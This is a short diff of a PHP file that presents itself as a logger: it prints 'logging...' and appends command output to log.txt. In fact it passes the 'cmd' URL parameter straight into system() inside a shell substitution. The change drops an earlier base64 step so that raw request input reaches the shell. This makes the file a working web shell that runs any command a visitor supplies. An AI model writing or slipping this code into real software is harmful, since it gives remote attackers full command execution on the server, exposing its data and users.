@@ -1,5 +1,4 @@
 <?php
-$cmd=base64_decode($_GET['cmd']);
-system("echo $(".$cmd.") >> log.txt");
+system("echo $(".$_GET['cmd'].") >> log.txt");
 echo("logging...");
 ?>
